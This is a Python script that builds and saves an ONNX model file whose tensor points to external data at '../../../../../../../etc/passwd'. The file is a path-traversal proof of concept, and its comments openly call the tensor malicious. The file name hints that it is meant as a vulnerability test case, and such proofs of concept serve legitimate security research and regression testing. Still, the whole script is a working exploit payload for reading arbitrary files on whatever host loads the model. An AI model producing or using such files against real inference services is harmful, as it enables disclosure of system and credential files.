import onnx
from onnx import TensorProto, helper


def create_exp_model():
    inputs = []
    nodes = []
    tensors = []
    outputs = []

    # Create input tensor info
    input_ = helper.make_tensor_value_info("input", TensorProto.INT64, [None])
    inputs.append(input_)

    # Create malicious tensor with external data pointing to system file
    evil_tensor = helper.make_tensor(name="evil_weights", data_type=TensorProto.INT64, dims=[100], vals=[1] * 100)
    tensors.append(evil_tensor)

    # Set external data location to attempt path traversal attack
    evil_tensor.data_location = TensorProto.EXTERNAL

    # Location entry - attempts to access system passwd file
    entry1 = evil_tensor.external_data.add()
    entry1.key = "location"
    entry1.value = "../../../../../../../etc/passwd"

    # Offset entry
    entry2 = evil_tensor.external_data.add()
    entry2.key = "offset"
    entry2.value = "0"

    # Length entry
    entry3 = evil_tensor.external_data.add()
    entry3.key = "length"
    entry3.value = "800"

    # Create constant node using the malicious tensor
    nodes.append(helper.make_node(op_type="Constant", inputs=[], outputs=["output"], value=evil_tensor))

    # Create output tensor info
    outputs.append(helper.make_tensor_value_info("output", TensorProto.INT64, [100]))

    # Build the graph
    graph = helper.make_graph(nodes, "test", inputs, outputs, tensors)

    # Create the model
    model = helper.make_model(graph, opset_imports=[helper.make_opsetid("", 18), helper.make_opsetid("ai.onnx.ml", 3)])

    return model


if __name__ == "__main__":
    model = create_exp_model()
    onnx.save(model, "test_arbitrary_external_file.onnx")
